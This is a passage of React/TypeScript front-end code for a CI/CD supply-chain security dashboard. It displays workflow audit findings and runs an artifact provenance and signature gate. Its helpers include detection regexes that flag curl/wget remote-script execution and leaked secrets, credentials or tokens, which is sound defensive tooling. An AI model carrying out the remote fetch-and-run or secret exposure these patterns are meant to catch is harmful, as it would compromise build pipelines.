              step.riskLevel === 'medium' ? 'border-amber-300 bg-amber-50 text-amber-700 dark:border-amber-500/30 dark:bg-amber-950/30 dark:text-amber-300' :
              step.riskLevel === 'low' ? 'border-slate-300 bg-slate-50 text-slate-600 dark:border-slate-500/30 dark:bg-slate-900/30 dark:text-muted-foreground' :
              'border-emerald-300 bg-emerald-50 text-emerald-700 dark:border-emerald-500/20 dark:bg-emerald-950/20 dark:text-emerald-300'
            )}>
              {step.riskLevel === 'normal' ? '正常' : `${step.riskCount} 风险`}
            </span>
            <span className='rounded-full border border-slate-200 bg-slate-50 px-2 py-0.5 text-[10px] text-slate-600 dark:border-slate-500/20 dark:bg-slate-900/30 dark:text-muted-foreground shrink-0'>
              {step.status}
            </span>
          </div>

          {/* Main entity — truncated with title tooltip */}
          <div className='rounded-lg surface-inset p-3 space-y-1.5'>
            <div className='text-[10px] uppercase tracking-wider text-muted-foreground'>主实体</div>
            <div className='text-sm font-bold truncate' title={step.mainEntity}>{step.mainEntity}</div>
            {step.description && (
              <div className='text-xs text-muted-foreground line-clamp-2 break-all' title={step.description}>
                {step.description}
              </div>
            )}
            <div className='flex items-center gap-2 text-[11px] text-muted-foreground flex-wrap'>
              <span className='shrink-0'>{step.time}</span>
              <span className='shrink-0'>·</span>
              <span className='truncate' title={step.source}>{step.source}</span>
            </div>
          </div>

          {/* Evidence summary — equal height cells */}
          <div className='grid grid-cols-3 gap-2 text-center text-xs'>
            <div className='rounded-lg surface-inset p-2.5 flex flex-col items-center justify-center h-[64px]'>
              <div className='text-xl font-black text-cyan-600 dark:text-cyan-400 tabular-nums'>{uniqueWorkflows.length}</div>
              <div className='mt-0.5 text-[10px] text-muted-foreground'>Workflows</div>
            </div>
            <div className='rounded-lg surface-inset p-2.5 flex flex-col items-center justify-center h-[64px]'>
              <div className='text-xl font-black text-orange-600 dark:text-orange-400 tabular-nums'>{uniqueJobs.length}</div>
              <div className='mt-0.5 text-[10px] text-muted-foreground'>Jobs</div>
            </div>
            <div className='rounded-lg surface-inset p-2.5 flex flex-col items-center justify-center h-[64px]'>
              <div className='text-xl font-black text-muted-foreground tabular-nums'>{findings.length}</div>
              <div className='mt-0.5 text-[10px] text-muted-foreground'>风险发现</div>
            </div>
          </div>

          {/* Finding list — with truncation + tooltip */}
          {findings.length > 0 && (
            <div className='space-y-2'>
              <div className='text-[10px] uppercase tracking-wider text-muted-foreground'>关联风险发现</div>
              {findings.slice(0, 6).map(f => (
                <div key={f.id} className='rounded-lg border border-border/40 bg-[color:var(--surface-panel)] p-2.5'>
                  <div className='flex items-start justify-between gap-2'>
                    <div className='min-w-0 flex-1'>
                      <div className='text-xs font-bold truncate' title={cicdFindingTitle(f)}>{cicdFindingTitle(f)}</div>
                      <div className='mt-1 text-[10px] text-muted-foreground font-mono line-clamp-2 break-all' title={f.evidence || ''}>
                        {f.evidence || '—'}
                      </div>
                      <div className='mt-1.5 flex items-center gap-1.5 text-[10px] text-muted-foreground flex-wrap'>
                        <span className='truncate max-w-[120px] font-mono' title={`${compactWorkflowPath(f.workflow)}:${f.line}`}>
                          {compactWorkflowPath(f.workflow)}:{f.line}
                        </span>
                        {f.job_name && (
                          <>
                            <span>·</span>
                            <span className='truncate max-w-[100px]' title={f.job_name}>{f.job_name}</span>
                          </>
                        )}
                      </div>
                    </div>
                    <SeverityPill severity={f.severity} />
                  </div>
                </div>
              ))}
              {findings.length > 6 && <p className='text-xs text-muted-foreground text-center'>+{findings.length - 6} 条</p>}
            </div>
          )}
        </CardContent>
      </Card>
    </motion.div>
  )
}


function CicdFindingNameList({
  findings,
  totalCount,
  selectedFinding,
  workflows,
  severityFilter,
  workflowFilter,
  onSeverityFilter,
  onWorkflowFilter,
  onReset,
  onSelect,
}: {
  findings: CicdFinding[]
  totalCount: number
  selectedFinding?: CicdFinding
  workflows: string[]
  severityFilter: string
  workflowFilter: string
  onSeverityFilter: (value: string) => void
  onWorkflowFilter: (value: string) => void
  onReset: () => void
  onSelect: (finding: CicdFinding) => void
}) {
  const filtered = severityFilter !== 'all' || workflowFilter !== 'all'

  return (
    <Card className='flex h-[620px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
      <CardHeader className='border-b border-border pb-3'>
        <div className='flex flex-wrap items-start justify-between gap-3'>
          <div className='min-w-0'>
            <div className='flex items-center gap-2'>
              <CardTitle className='text-section-title'>风险明细</CardTitle>
              <span className='meta-chip'>{findings.length}/{totalCount}</span>
            </div>
            <div className='mt-1 text-xs text-muted-foreground'>按风险优先级检查 Workflow、Job 与 Step</div>
          </div>
          <div className='flex flex-wrap items-center justify-end gap-2'>
            {filtered ? (
              <button
                type='button'
                className='inline-flex h-7 items-center whitespace-nowrap rounded-full border border-cyan-400/35 bg-cyan-500/10 px-2.5 text-[12px] font-bold text-cyan-700 transition-colors dark:text-cyan-200'
                onClick={onReset}
              >
                全部
              </button>
            ) : null}
          <Select value={severityFilter} onValueChange={onSeverityFilter}>
            <SelectTrigger size='sm' className='h-7 min-w-[104px] rounded-md border-border bg-[color:var(--surface-inset)] text-foreground'>
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value='all'>全部等级</SelectItem>
              <SelectItem value='critical'>严重</SelectItem>
              <SelectItem value='high'>高危</SelectItem>
              <SelectItem value='medium'>中危</SelectItem>
              <SelectItem value='low'>低危</SelectItem>
            </SelectContent>
          </Select>
          <Select value={workflowFilter} onValueChange={onWorkflowFilter}>
            <SelectTrigger size='sm' className='h-7 min-w-[140px] rounded-md border-border bg-[color:var(--surface-inset)] text-foreground'>
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value='all'>全部 Workflow</SelectItem>
              {workflows.map((workflow) => (
                <SelectItem key={workflow} value={workflow}>{compactWorkflowPath(workflow)}</SelectItem>
              ))}
            </SelectContent>
          </Select>
          </div>
        </div>
      </CardHeader>
      <CardContent className='min-h-0 flex-1 p-0'>
        {findings.length ? (
          <div className='flex h-full min-h-0 flex-col'>
            <div className='hidden grid-cols-[minmax(0,1.35fr)_minmax(150px,0.75fr)_64px] gap-4 border-b border-border bg-[color:var(--surface-inset)] px-5 py-2 text-[11px] font-semibold text-muted-foreground md:grid'>
              <span>风险项</span>
              <span>位置</span>
              <span className='text-right'>评分</span>
            </div>
            <div className='min-h-0 flex-1 overflow-y-auto overscroll-contain [scrollbar-gutter:stable] [scrollbar-width:thin]'>
              {findings.map((finding) => {
                const selected = finding.fingerprint === selectedFinding?.fingerprint
                const location = finding.step_name || finding.job_name || finding.job_id || `第 ${finding.line || 0} 行`
                return (
                  <motion.button
                    key={finding.fingerprint}
                    type='button'
                    layout
                    onClick={() => onSelect(finding)}
                    className={cn(
                      'grid w-full grid-cols-[minmax(0,1fr)_auto] items-center gap-4 border-b border-border/70 px-5 py-3.5 text-left transition-colors md:grid-cols-[minmax(0,1.35fr)_minmax(150px,0.75fr)_64px]',
                      selected
                        ? 'bg-cyan-500/10 shadow-[inset_3px_0_0_rgb(6,182,212)]'
                        : 'hover:bg-[color:var(--surface-inset)]',
                    )}
                  >
                    <span className='flex min-w-0 items-center gap-3'>
                      <SeverityPill severity={finding.severity} />
                      <span className='min-w-0'>
                        <span className='block truncate text-sm font-semibold text-foreground' title={cicdFindingTitle(finding)}>
                          {cicdFindingTitle(finding)}
                        </span>
                        <span className='mt-1 block truncate text-xs text-muted-foreground md:hidden'>
                          {compactWorkflowPath(finding.workflow)} · {location}
                        </span>
                      </span>
                    </span>
                    <span className='hidden min-w-0 md:block'>
                      <span className='block truncate text-xs font-medium text-foreground' title={finding.workflow}>
                        {compactWorkflowPath(finding.workflow) || 'Workflow'}
                      </span>
                      <span className='mt-1 block truncate text-xs text-muted-foreground' title={location}>{location}</span>
                    </span>
                    <span className='text-right text-sm font-bold tabular-nums text-foreground'>{finding.score ?? 0}</span>
                  </motion.button>
                )
              })}
            </div>
          </div>
        ) : (
          <div className='grid h-full place-items-center p-6 text-center text-sm text-muted-foreground'>无匹配风险</div>
        )}
      </CardContent>
    </Card>
  )
}

function CicdFindingDetailPanel({
  finding,
  totalCount,
  disabled,
  onIgnore,
}: {
  finding?: CicdFinding
  totalCount: number
  disabled: boolean
  onIgnore: (finding: CicdFinding) => void
}) {
  if (!finding) {
    return (
      <Card className='flex h-[620px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
        <CardHeader className='border-b border-border pb-3'>
          <CardTitle className='min-w-0 truncate text-base text-foreground'>风险属性</CardTitle>
        </CardHeader>
        <CardContent className='min-w-0 flex-1 overflow-y-auto overscroll-contain pr-1 [scrollbar-gutter:stable] [scrollbar-width:thin]'>
          <div className='rounded-md border border-slate-400/10 bg-[color:var(--surface-inset)] p-6 text-center text-sm text-muted-foreground'>
            {totalCount ? '选择左侧风险查看原因、证据和修复建议。' : '当前筛选条件下没有风险。'}
          </div>
        </CardContent>
      </Card>
    )
  }

  return (
    <Card className='flex h-[620px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
      <CardHeader className='border-b border-border pb-3'>
        <CardTitle className='min-w-0 text-base leading-6 text-foreground' title={cicdFindingTitle(finding)}>
          {cicdFindingTitle(finding)}
        </CardTitle>
        <div className='mt-1 truncate text-xs text-muted-foreground' title={finding.workflow}>
          {compactWorkflowPath(finding.workflow) || 'Workflow'}{finding.line ? ` · 第 ${finding.line} 行` : ''}
        </div>
      </CardHeader>
      <CardContent className='min-w-0 flex-1 space-y-3 overflow-y-auto overscroll-contain pr-1 [scrollbar-gutter:stable] [scrollbar-width:thin]'>
        <div className='flex flex-wrap gap-2'>
          <SeverityPill severity={finding.severity} />
          <span className='rounded-full border border-red-400/30 bg-red-500/10 px-2 py-0.5 text-xs font-medium text-red-700 dark:text-red-200'>
            风险 {finding.score ?? 0}
          </span>
          <span className='rounded-full border border-cyan-400/30 bg-cyan-500/10 px-2 py-0.5 text-xs font-medium text-cyan-700 dark:text-cyan-200'>
            {finding.scanner || 'CI/CD'}
          </span>
        </div>
        <div className='grid gap-2 text-sm'>
          <DetailRow label='Workflow' value={compactWorkflowPath(finding.workflow) || '-'} />
          <DetailRow label='Job' value={finding.job_name || finding.job_id || '-'} />
          <DetailRow label='Step' value={finding.step_name || cicdPrimaryNodeLabel(finding)} />
          <DetailRow label='规则' value={finding.rule_id || '-'} />
        </div>
        <CicdInfoBlock title='风险原因' text={cicdReasonText(finding)} />
        <CicdInfoBlock title='关键证据' text={finding.evidence || '-'} mono />
        <CicdInfoBlock title='修复建议' text={cicdRecommendationText(finding)} tone='action' />
        <Button variant='outline' className='w-full' disabled={disabled} onClick={() => onIgnore(finding)}>
          <EyeOff className='size-4' />
          忽略此风险
        </Button>
      </CardContent>
    </Card>
  )
}


function cicdFindingNodeIds(finding: CicdFinding) {
  const text = `${finding.rule_id} ${finding.reason} ${finding.evidence} ${finding.workflow} ${finding.job_id} ${finding.job_name} ${finding.step_name}`.toLowerCase()
  const ids = new Set<string>()
  if (finding.workflow) ids.add('workflow')
  if (finding.job_id || finding.job_name) ids.add('job')
  if (finding.step_name || (finding.step_index !== null && finding.step_index !== undefined)) ids.add('step')
  if (/uses:\s*[^\s]+\/|action|unpinned|mutable|checkout|setup-|upload-artifact|docker:/.test(text)) ids.add('action')
  if (/runner|self-hosted/.test(text)) ids.add('runner')
  if (/artifact|provenance|attestation|digest|slsa/.test(text)) ids.add('artifact')
  if (/provenance|attestation|slsa/.test(text)) ids.add('provenance')
  if (/log|runtime|evidence/.test(text)) ids.add('logs')
  if (/pull_request|trigger|schedule|workflow_dispatch|push/.test(text)) ids.add('trigger')
  return ids.size ? Array.from(ids) : ['workflow']
}

function cicdPrimaryNodeLabel(finding: CicdFinding) {
  const ids = cicdFindingNodeIds(finding)
  return cicdGraphNodeLabel(ids.find((id) => !['workflow', 'job', 'step'].includes(id)) ?? ids[ids.length - 1] ?? 'workflow')
}

function cicdGraphNodeLabel(nodeId: string) {
  return {
    workflow: 'Workflow',
    trigger: 'Trigger',
    job: 'Job',
    step: 'Step',
    action: 'Action',
    runner: 'Runner',
    artifact: 'Artifact',
    provenance: 'Provenance',
    logs: 'Log',
  }[nodeId] ?? nodeId
}

function buildCoreCicdPipeline(pipeline: SecurityPipelineStep[]) {
  const coreSteps = new Set(['commit', 'workflow', 'build', 'artifact', 'attestation', 'runtime-correlation', 'deploy'])
  return pipeline.filter((step) => {
    if (!coreSteps.has(step.step)) return false
    if (step.step === 'workflow' && step.actor === 'SupplyGuard CI/CD Audit') return false
    if (step.step === 'workflow' && /Workflow\s*扫描|扫描\s*\d+\s*个/.test(step.name)) return false
    return true
  })
}

function buildCicdConclusion(
  audit: CICDAuditResult | null | undefined,
  pipeline: SecurityPipelineStep[],
  findings: CicdFinding[]
) {
  if (!audit) {
    return {
      summary: '尚未执行 CI/CD 扫描。扫描后系统会定位 workflow、job、step、runner 和产物可信链路中的风险。',
      keyRisks: ['等待 workflow 扫描', '等待构建链证据', '等待处置建议'],
    }
  }

  const hasWriteAll = findings.some((finding) => /write-all|GITHUB_TOKEN/i.test(`${finding.reason} ${finding.evidence}`))
  const hasUnpinnedAction = findings.some((finding) => /unpinned|tag|短引用|Action/i.test(`${finding.rule_id} ${finding.reason}`))
  const hasArtifactRisk = pipeline.some((step) => ['artifact', 'attestation'].includes(step.step) && ['critical', 'high'].includes(step.status))
  const hasSelfHosted = pipeline.some((step) => /self-hosted/i.test(`${step.name} ${step.detail} ${step.actor}`))
  const keyRisks = [
    hasWriteAll ? 'GITHUB_TOKEN 权限过大' : null,
    hasUnpinnedAction ? 'Action 版本未固定' : null,
    hasSelfHosted ? '构建 runner 为自托管环境' : null,
    hasArtifactRisk ? '构建产物或来源证明异常' : null,
  ].filter(Boolean) as string[]

  return {
    summary: `本次扫描覆盖 ${audit.summary.workflow_count} 个 workflow、${audit.summary.total_steps} 个 step，发现 ${audit.summary.finding_count} 项构建链风险。风险集中在 ${keyRisks.length ? keyRisks.join('、') : 'workflow 配置与构建步骤'}，需要优先确认构建输入是否可复现、产物来源是否可信。`,
    keyRisks: keyRisks.length ? keyRisks.slice(0, 3) : ['未发现高优先级构建链风险'],
  }
}

function CicdInfoBlock({
  title,
  text,
  mono = false,
  tone = 'default',
}: {
  title: string
  text: string
  mono?: boolean
  tone?: 'default' | 'action'
}) {
  const isAction = tone === 'action'
  return (
    <div className={cn(
      'min-w-0 overflow-hidden rounded-md border p-3',
      isAction
        ? 'border-cyan-300/60 bg-cyan-50/90 text-slate-900 shadow-sm dark:border-cyan-300/30 dark:bg-cyan-400/10 dark:text-cyan-50'
        : 'border-border bg-[color:var(--surface-inset)] text-[color:var(--type-body)]'
    )}>
      <div className={cn('mb-2 flex items-center gap-1.5 text-sm font-bold', isAction ? 'text-cyan-800 dark:text-cyan-100' : 'text-[color:var(--type-body)]')}>
        {isAction ? <ShieldCheck className='size-4' /> : null}
        {title}
      </div>
      <div className={cn('break-words text-body [overflow-wrap:anywhere]', mono && 'code-evidence', isAction && 'font-semibold text-slate-800 dark:text-cyan-50')}>
        {text}
      </div>
    </div>
  )
}

function cicdFindingTitle(finding: CicdFinding) {
  if (/write-all|GITHUB_TOKEN/i.test(`${finding.reason} ${finding.evidence}`)) return 'GITHUB_TOKEN 权限过大'
  if (/unpinned|tag|短引用|Action/i.test(`${finding.rule_id} ${finding.reason}`)) return 'Action 版本未固定'
  if (/secret|credential|token/i.test(`${finding.rule_id} ${finding.reason}`)) return 'Workflow 疑似包含敏感信息'
  if (/curl|wget|remote|远程/i.test(`${finding.rule_id} ${finding.reason}`)) return '远程脚本执行风险'
  return finding.title || finding.reason || finding.rule_id
}

function cicdReasonText(finding: CicdFinding) {
  if (/write-all|GITHUB_TOKEN/i.test(`${finding.reason} ${finding.evidence}`)) {
    return 'Workflow 授予了过大的写权限，一旦 Action、依赖或脚本被污染，攻击者可能修改代码、发布产物或扩大影响范围。'
  }
  if (/unpinned|tag|短引用|Action/i.test(`${finding.rule_id} ${finding.reason}`)) {
    return 'Action 使用 tag 或短引用，版本可能被移动或覆盖，导致构建输入不可复现。'
  }
  return summarizeLongText(finding.reason, 120)
}

function cicdRecommendationText(finding: CicdFinding) {
  if (/write-all|GITHUB_TOKEN/i.test(`${finding.reason} ${finding.evidence}`)) {
    return '将 permissions 改为最小权限，例如 contents: read，仅给必要 job 开启写权限。'
  }
  if (/unpinned|tag|短引用|Action/i.test(`${finding.rule_id} ${finding.reason}`)) {
    return '将第三方 Action 固定到完整 commit SHA，并定期复核来源仓库可信度。'
  }
  return summarizeLongText(finding.recommendation, 120)
}

function compactWorkflowPath(path: string) {
  const parts = path.split(/[\\/]/).filter(Boolean)
  return parts.length ? parts[parts.length - 1] : path
}

function summarizeLongText(text: string, limit: number) {
  if (!text) return '-'
  return text.length > limit ? `${text.slice(0, limit - 1)}...` : text
}

function truncateMiddle(value: string, max = 40) {
  if (!value || value.length <= max) return value
  const head = Math.ceil((max - 3) / 2)
  const tail = Math.floor((max - 3) / 2)
  return `${value.slice(0, head)}...${value.slice(-tail)}`
}

function LegacyArtifactTrustPanel({
  result,
  workspaceId,
  onScanned,
}: {
  result?: ArtifactTrustResult | null
  workspaceId?: string
  onScanned: (result: ArtifactTrustResult) => void | Promise<void>
}) {
  const [artifactFile, setArtifactFile] = useState<File | null>(null)
  const [attestationFile, setAttestationFile] = useState<File | null>(null)
  const [expectedRepo, setExpectedRepo] = useState('https://github.com/HEIBAI198/Security')
  const [expectedCommit, setExpectedCommit] = useState('e3e9f7c03ce502642fa9bc9e2c35764c92354c9b')
  const [allowedWorkflows, setAllowedWorkflows] = useState('.github/workflows/release.yml')
  const [allowedBuilders, setAllowedBuilders] = useState('https://github.com/HEIBAI198/Security/.github/workflows/release.yml@refs/heads/main')
  const [requireSignature, setRequireSignature] = useState(true)
  const [allowSelfHostedRunner, setAllowSelfHostedRunner] = useState(false)
  const [scanning, setScanning] = useState(false)
  const [checksOpen, setChecksOpen] = useState(true)
  const score = result ? artifactTrustScore(result) : 0
  const provenance = result?.provenance ?? {}
  const failedChecks = result?.checks.filter((check) => ['fail', 'missing', 'warn'].includes(check.status)) ?? []
  const trustConclusion = result ? artifactTrustConclusion(result) : null

  async function scanSample() {
    setScanning(true)
    try {
      const result = await runArtifactTrustScan({
        workspaceId,
        artifactPath: 'storage/artifact_trust/uploads/test-checkout-api.tar.gz',
        attestationPath: 'storage/artifact_trust/uploads/test-attestation.jsonl',
        expectedRepo,
        expectedCommit,
        allowedWorkflows: splitPolicyList(allowedWorkflows),
        allowedBuilders: splitPolicyList(allowedBuilders),
        requireSignature,
        requireProvenance: true,
        allowSelfHostedRunner,
        maxAgeHours: 24,
      })
      await onScanned(result)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '产物可信验证失败')
    } finally {
      setScanning(false)
    }
  }

  async function scanUpload() {
    if (!artifactFile || !attestationFile) {
      toast.error('请选择 artifact 和 attestation 文件')
      return
    }
    setScanning(true)
    try {
      const result = await uploadArtifactTrustScan({
        workspaceId,
        artifact: artifactFile,
        attestation: attestationFile,
        expectedRepo,
        expectedCommit,
        allowedWorkflows: splitPolicyList(allowedWorkflows),
        allowedBuilders: splitPolicyList(allowedBuilders),
        requireSignature,
        requireProvenance: true,
        allowSelfHostedRunner,
        maxAgeHours: 24,
      })
      await onScanned(result)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '上传验证失败')
    } finally {
      setScanning(false)
    }
  }

  async function downloadArtifactTrustReport() {
    try {
      const report = result?.report ?? (await loadArtifactTrustReport()).content
      downloadReport(report)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '产物可信报告导出失败')
    }
  }

  return (
    <div className={cn(moduleSplitGridClass, 'xl:grid-cols-[minmax(0,1fr)_520px]')}>
      <div className={moduleMainColumnClass}>
        <Card className={cn(moduleCardClass, 'overflow-hidden')}>
          <CardHeader>
            <div className='flex flex-wrap items-start justify-between gap-3'>
              <div>
                <CardTitle className='flex items-center gap-2 text-base'>
                  <Fingerprint className='size-4 text-cyan-600' />
                  发布前产物可信验证门
                </CardTitle>
              </div>
              <div className='flex shrink-0 gap-2'>
                <Button variant='outline' size='sm' onClick={() => void downloadArtifactTrustReport()}>
                  <Download />
                  导出报告
                </Button>
                <Button size='sm' className={actionButtonClass} onClick={() => void scanUpload()} disabled={scanning}>
                  {scanning ? <Loader2 className='animate-spin' /> : <Upload />}
                  上传并执行门禁
                </Button>
                <Button size='sm' className={actionButtonClass} onClick={() => void scanSample()} disabled={scanning}>
                  {scanning ? <Loader2 className='animate-spin' /> : <RefreshCw />}
                  执行产物可信门禁
                </Button>
              </div>
            </div>
        </CardHeader>
        <CardContent className='space-y-4'>
          {result ? (
            <>
              <div className={cn('rounded-md border p-4', score >= 90 ? 'border-emerald-200 bg-emerald-50/60 dark:border-emerald-900 dark:bg-emerald-950/20' : 'border-red-200 bg-red-50/60 dark:border-red-900 dark:bg-red-950/20')}>
                <div className='flex flex-wrap items-start justify-between gap-3'>
                  <div>
                    <div className='text-sm font-medium'>产物可信结论</div>
                    <p className='mt-2 max-w-4xl text-sm leading-6 text-muted-foreground'>
                      {trustConclusion?.summary}
                    </p>
                  </div>
                  <Badge variant='outline' className={cn('rounded-md', score >= 90 ? statusClasses.active : severityClasses.critical)}>
                    {score >= 90 ? '可放行' : '建议阻断'}
                  </Badge>
                </div>
                {trustConclusion?.reasons.length ? (
                  <div className='mt-3 grid gap-2 md:grid-cols-2 xl:grid-cols-4'>
                    {trustConclusion.reasons.map((reason) => (
                      <div key={reason} className='rounded-md border bg-background px-3 py-2 text-sm'>
                        {reason}
                      </div>
                    ))}
                  </div>
                ) : null}
              </div>
              <div className='grid gap-3 sm:grid-cols-2 xl:grid-cols-5'>
                <AuditMetric label='可信评分' value={score} tone={score >= 90 ? 'emerald' : score >= 75 ? 'amber' : 'red'} />
                <AuditMetric label='检查项' value={result.summary.check_count} tone='cyan' />
                <AuditMetric label='通过' value={result.summary.passed} tone='emerald' />
                <AuditMetric label='失败/缺失' value={(result.summary.failed ?? 0) + (result.summary.missing ?? 0)} tone='red' />
                <AuditMetric label='警告/跳过' value={(result.summary.warnings ?? 0) + (result.summary.skipped ?? 0)} tone='amber' />
              </div>
            </>
          ) : (
            <Alert className='rounded-md'>
              <KeyRound className='size-4' />
                <AlertTitle>等待产物可信验证</AlertTitle>
                <AlertDescription>
                  可先点击“执行产物可信门禁”，也可以上传构建产物和 GitHub/SLSA attestation JSON/JSONL。
                </AlertDescription>
            </Alert>
          )}

          <Collapsible>
            <CollapsibleTrigger asChild>
              <Button variant='outline' className='w-full justify-between rounded-md'>
                验证配置
                <ChevronDown className='size-4' />
              </Button>
            </CollapsibleTrigger>
            <CollapsibleContent className='mt-3 space-y-4'>
              {result ? (
                <div className='grid gap-2 md:grid-cols-3'>
                  <ArtifactConfigSummary label='Artifact' value={result.artifact} />
                  <ArtifactConfigSummary label='Attestation' value={result.attestation_path ? '已解析' : '未提供'} />
                  <ArtifactConfigSummary label='策略' value={allowSelfHostedRunner ? '允许 self-hosted runner' : '禁止 self-hosted runner'} />
                </div>
              ) : null}
              <div className='grid gap-3 lg:grid-cols-2'>
                <div className='space-y-2'>
                  <Label htmlFor='artifact-file'>Artifact 文件</Label>
                  <Input
                    id='artifact-file'
                    type='file'
                    className={fileInputClass}
                    onChange={(event) => setArtifactFile(event.target.files?.[0] ?? null)}
                  />
                </div>
                <div className='space-y-2'>
                  <Label htmlFor='attestation-file'>Attestation JSON / JSONL</Label>
                  <Input
                    id='attestation-file'
                    type='file'
                    accept='.json,.jsonl,application/json'
                    className={fileInputClass}
                    onChange={(event) => setAttestationFile(event.target.files?.[0] ?? null)}
                  />
                </div>
              </div>

              <div className='grid gap-3 lg:grid-cols-2'>
                <div className='space-y-2'>
                  <Label htmlFor='artifact-expected-repo'>可信源码仓库</Label>
                  <Input id='artifact-expected-repo' value={expectedRepo} onChange={(event) => setExpectedRepo(event.target.value)} />
                </div>
                <div className='space-y-2'>
                  <Label htmlFor='artifact-expected-commit'>预期 commit</Label>
                  <Input id='artifact-expected-commit' value={expectedCommit} onChange={(event) => setExpectedCommit(event.target.value)} />
                </div>
                <div className='space-y-2'>
                  <Label htmlFor='artifact-workflows'>允许 workflow</Label>
                  <Input id='artifact-workflows' value={allowedWorkflows} onChange={(event) => setAllowedWorkflows(event.target.value)} />
                </div>
                <div className='space-y-2'>
                  <Label htmlFor='artifact-builders'>可信 builder</Label>
                  <Input id='artifact-builders' value={allowedBuilders} onChange={(event) => setAllowedBuilders(event.target.value)} />
                </div>
              </div>

              <div className='flex flex-wrap gap-3'>
                <div className='flex items-center gap-2 rounded-md border px-3 py-2 text-sm'>
                  <Switch checked={requireSignature} onCheckedChange={setRequireSignature} aria-label='要求签名验签' />
                  要求签名验签
                </div>
                <div className='flex items-center gap-2 rounded-md border px-3 py-2 text-sm'>
                  <Switch checked={allowSelfHostedRunner} onCheckedChange={setAllowSelfHostedRunner} aria-label='允许 self-hosted runner' />
                  允许 self-hosted runner
                </div>
              </div>
            </CollapsibleContent>
          </Collapsible>
        </CardContent>
      </Card>

        <Card className={moduleCardClass}>
          <CardHeader>
            <CardTitle className='flex items-center gap-2 text-base'>
              <ShieldCheck className='size-4 text-emerald-600' />
              检查项结果
            </CardTitle>
          </CardHeader>
          <CardContent>
            {result?.checks.length ? (
              <div className='space-y-3'>
                {failedChecks.length ? (
                  <div className='space-y-2'>
                    <div className='text-sm font-medium'>关键失败项</div>
                    {failedChecks.map((check) => (
                      <ArtifactTrustCheckCard key={check.name} check={check} important />
                    ))}
                  </div>
                ) : null}
                <Collapsible open={checksOpen} onOpenChange={setChecksOpen}>
                  <CollapsibleTrigger asChild>
                    <Button
                      type='button'
                      variant='outline'
                      className='w-full justify-between rounded-md'
                      aria-expanded={checksOpen}
                    >
                      全部检查项（{result.checks.length}）
                      <ChevronDown className={cn('size-4 transition-transform duration-200', checksOpen && 'rotate-180')} />
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className='mt-3 space-y-2'>
                    {result.checks.map((check) => (
                      <ArtifactTrustCheckCard key={check.name} check={check} />
                    ))}
                  </CollapsibleContent>
                </Collapsible>
              </div>
            ) : (
              <div className='rounded-md border border-dashed p-6 text-center text-sm text-muted-foreground'>
                执行验证后将在这里展示发布门检查项。
              </div>
            )}
          </CardContent>
        </Card>
      </div>

      <div className={moduleSidebarColumnClass}>
        <Card className={moduleCardClass}>
          <CardHeader>
            <CardTitle className='flex items-center gap-2 text-base'>
              <KeyRound className='size-4 text-cyan-600' />
              Provenance 摘要
            </CardTitle>
          </CardHeader>
          <CardContent className='space-y-3'>
            {result ? (
              <>
                <div className='rounded-md border p-3'>
                  <div className='text-xs text-muted-foreground'>Artifact digest</div>
                  <code className='mt-1 block truncate text-xs'>{shortDigest(result.digest)}</code>
                </div>
                <ProvenanceRow label='Repo' value={provenance.source_repo} formatter={shortRepoName} />
                <ProvenanceRow label='Commit' value={provenance.commit} formatter={(value) => truncateMiddle(value, 14)} />
                <ProvenanceRow label='Workflow' value={provenance.workflow} formatter={compactWorkflowPath} />
                <ProvenanceRow label='Builder' value={provenance.builder_id} formatter={(value) => truncateMiddle(value, 34)} />
                <ProvenanceRow label='Runner' value={provenance.runner_environment} />
                <ProvenanceRow label='Predicate' value={provenance.predicateType || provenance.predicate_type} formatter={(value) => truncateMiddle(value, 34)} />
              </>
            ) : (
              <div className='rounded-md border border-dashed p-4 text-sm text-muted-foreground'>
                尚未解析 provenance。
              </div>
            )}
          </CardContent>
        </Card>

        <Card className={moduleCardClass}>
          <CardHeader>
            <CardTitle className='flex items-center gap-2 text-base'>
              <ShieldAlert className='size-4 text-orange-600' />
              风险发现
            </CardTitle>
          </CardHeader>
          <CardContent className='space-y-3'>
            {result?.findings.length ? result.findings.map((finding) => (
              <ArtifactTrustFindingCard key={finding.id} finding={finding} />
            )) : (
              <div className='rounded-md border border-dashed p-4 text-sm text-muted-foreground'>
                {result ? '未发现阻断项。' : '验证后显示产物可信风险。'}
              </div>
            )}
          </CardContent>
        </Card>

        <Card className={moduleCardClass}>
          <CardHeader>
            <CardTitle className='flex items-center gap-2 text-base'>
              <TerminalSquare className='size-4 text-slate-600' />
              验签工具
            </CardTitle>
          </CardHeader>
          <CardContent className='space-y-3'>
            <ScannerStatusList scanners={result?.tools ?? []} />
          </CardContent>
        </Card>
      </div>
    </div>
  )
}

void LegacyArtifactTrustPanel

function ArtifactTrustPanel({ result, workspaceId, onScanned }: {
  result?: ArtifactTrustResult | null
  workspaceId?: string
  onScanned: (result: ArtifactTrustResult) => void | Promise<void>
}) {
  const [artifactFile, setArtifactFile] = useState<File | null>(null)
  const [attestationFile, setAttestationFile] = useState<File | null>(null)
  const [expectedRepo, setExpectedRepo] = useState('')
  const [expectedCommit, setExpectedCommit] = useState('')
  const [allowedWorkflows, setAllowedWorkflows] = useState('')
  const [allowedBuilders, setAllowedBuilders] = useState('')
  const [requireSignature] = useState(true)
  const [allowSelfHostedRunner] = useState(false)
  const [scanning, setScanning] = useState(false)
  const [supplementOpen, setSupplementOpen] = useState(false)
  const [activeIssueId, setActiveIssueId] = useState<string | null>(null)
  const [lastUploadedScanId, setLastUploadedScanId] = useState<string | null>(null)
  const [lastUploadedMaterialKey, setLastUploadedMaterialKey] = useState('')
  const activeResult = result ?? undefined
  const score = activeResult ? artifactTrustScore(activeResult) : 0
  const { value: displayedScore } = useAnimatedNumber(score, { durationMs: 900, delayMs: 80, resetKey: activeResult?.scan_id ?? activeResult?.artifact ?? 'empty' })
  const checks = activeResult?.checks ?? []
